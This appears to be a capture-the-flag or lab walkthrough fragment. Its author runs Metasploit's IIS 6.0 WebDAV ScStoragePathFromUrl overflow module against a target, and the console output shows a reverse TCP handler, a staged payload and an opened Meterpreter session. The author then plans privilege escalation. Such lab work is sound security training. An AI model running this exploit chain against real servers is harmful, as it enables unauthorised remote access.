Found a potential CVE for Microsoft IIS 6.0

Found this on msfconsole:
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow

[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run

[*] Started reverse TCP handler on 10.10.14.206:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.129.95.234
[*] Meterpreter session 1 opened (10.10.14.206:4444 -> 10.129.95.234:1031) at 2024-07-15 14:55:27 -0500

This gave us initial foothold into the server

I’m going to use msfconsole’s multi/recon/local_exploit_suggester now on the session:
